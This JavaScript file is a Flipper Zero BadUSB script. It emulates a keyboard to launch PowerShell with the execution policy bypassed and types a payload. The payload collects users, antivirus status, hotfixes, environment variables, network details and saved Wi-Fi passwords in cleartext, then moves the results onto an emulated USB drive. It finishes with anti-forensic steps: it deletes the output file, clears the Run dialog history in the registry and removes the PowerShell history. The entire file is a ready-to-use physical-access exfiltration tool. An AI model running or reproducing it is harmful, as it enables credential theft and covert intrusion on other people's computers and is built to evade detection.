//MassStorage Name
let image = "/ext/apps_data/mass_storage/Exfil.img";
//MassStorage Size
let size = 8 * 1024 * 1024 * 20;
//Le Script
let script = [
	"$Date = Get-Date -Format yyyy-MM-dd;",//Get Date
	"$Time = Get-Date -Format hh-mm-ss;",//Get Time
    "$Date >> stats.txt; $Time >> stats.txt;",
	"Get-CimInstance -ClassName Win32_ComputerSystem >> stats.txt;", //Listing computer manufacturer and model
	"Get-LocalUser >> stats.txt;", //List users on the system 
	"Get-LocalUser | Where-Object -Property PasswordRequired -Match false >> stats.txt;", //Which users has password required set to false
	"Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct >> stats.txt;", // List which AntiVirus Product is being used
	"Get-CimInstance -ClassName Win32_QuickFixEngineering >> stats.txt;", // Listing installed hotfixes
	"(netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;",//Get network profiles with passwords
	"dir env: >> stats.txt;", //Check ENV
	"Get-Computerinfo >> stats.txt;", //ComputerInfo
	"Get-Service >> stats.txt;", // Get runing services 
	"Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;", //Check all IPV4 sufix that is not localhost
	"GEt-NetTCPConnection | Where-Object -Property State -Match Listen >> stats.txt;", //List listening ports	
	"Get-NetTCPConnection | Select-Object -Property * >> stats.txt;", // Get TCP information, ports, state etc..
];

//Requirements
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");

//Check if MassStorage image Exists...
print("Checking for Image...");
if (storage.fileExists(image)) {
    print ("Storage Exists.");
}
//Create MassStorage in case it doesnt exists
else {
	print ("Creating Storage...");
	usbdisk.createImage(image, size);
}

//VID&PID as HID
badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfrName: "Flipper", prodName: "Zero", layoutPath: "/ext/badusb/assets/layouts/en-US.kl" });
print("Waiting for connection");

//Keep Connected
while (!badusb.isConnected()) {
    delay(1000);
}

//Program Start!!
badusb.press("GUI", "r");//Open admin tools menu
delay(600);
badusb.println("powershell -NoProfile -ExecutionPolicy Bypass");//Select PowerShell
delay(600);

//Script crawler
print("Running payload");
for (let i = 0; i < script.length; i++) {
    badusb.println(script[i]);
    delay(100);
}
badusb.press("ENTER");

// Added commands below to delete stats.txt after copying to the flipper, then delete the run dialog and PowerShell history for a clean exfil
badusb.println("echo 'Please wait until this Window closes to eject the disk!'; Start-Sleep 10; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; New-Item -ItemType Directory -Force -Path ${DriveLetter}:\\${Date}\\; Move-Item -Path stats.txt -Destination ${DriveLetter}:\\${Date}\\${env:computername}_${Time}.txt; Remove-Item stats.txt; reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue ;exit")
badusb.press("ENTER");
badusb.quit();
delay(2000);
usbdisk.start(image);//Open MassStorage Folder
print("Please wait until powershell window closes to eject...");

//Ejected check
while (!usbdisk.wasEjected()) {
    delay(1000);
}
//Stop Script
usbdisk.stop();
print("Done");